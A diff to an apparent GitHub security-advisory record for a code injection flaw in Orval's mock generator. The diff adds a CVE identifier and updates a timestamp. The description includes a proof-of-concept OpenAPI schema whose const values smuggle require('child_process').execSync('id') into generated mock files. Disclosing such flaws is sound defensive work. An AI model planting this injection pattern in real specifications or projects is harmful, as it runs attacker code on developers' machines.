@@ -45,6 +45,10 @@
       {
         "Type": "GHSA",
         "Value": "GHSA-f456-rf33-4626"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-24132"
       }
     ],
     "Description": "I am reporting a code injection vulnerability in Orval’s mock generation pipeline affecting @orval/mock in both the 7.x and 8.x series. This issue is related in impact to the previously reported enum x-enumDescriptions (https://github.com/advisories/GHSA-h526-wf6g-67jv), but it affects a different code path in the faker-based mock generator rather than @orval/core.\n\nThe vulnerability allows untrusted OpenAPI specifications to inject arbitrary TypeScript/JavaScript into generated mock files via the const keyword on schema properties. These const values are interpolated into the mock scalar generator (getMockScalar in packages/mock/src/faker/getters/scalar.ts) without proper escaping or type-safe serialization, which results in attacker-controlled code being emitted into both interface definitions and faker/MSW handlers. I have confirmed that this occurs on orval@7.19.0 and orval@8.0.2 with mock: true, and that the generated mocks contain executable payloads such as require('child_process').execSync('id') in the output TypeScript.\n\n```yaml\nopenapi: 3.1.0\ninfo:\n  title: Mock Const Injection PoC\n  version: 1.0.0\npaths:\n  /test:\n    get:\n      operationId: getTests\n      responses:\n        '200':\n          description: OK\n          content:\n            application/json:\n              schema:\n                $ref: '#/components/schemas/Tests'\ncomponents:\n  schemas:\n    Tests:\n      type: object\n      properties:\n        EvilString:\n          type: string\n          const: \"'); require('child_process').execSync('id'); //\"\n        EvilNumber:\n          type: number\n          const: \"0); require('child_process').execSync('id'); //\"\n        SafeEnum:\n          type: string\n          enum: [\"test\"]\n\n```",
@@ -52,7 +56,7 @@
     "PublishedAt": "2026-01-22T18:09:13Z",
     "Severity": "HIGH",
     "Summary": "Orval Mock Generation Code Injection via const",
-    "UpdatedAt": "2026-01-22T18:09:14Z",
+    "UpdatedAt": "2026-01-22T21:36:04Z",
     "WithdrawnAt": "",
     "CVSS": {
       "Score": 0,
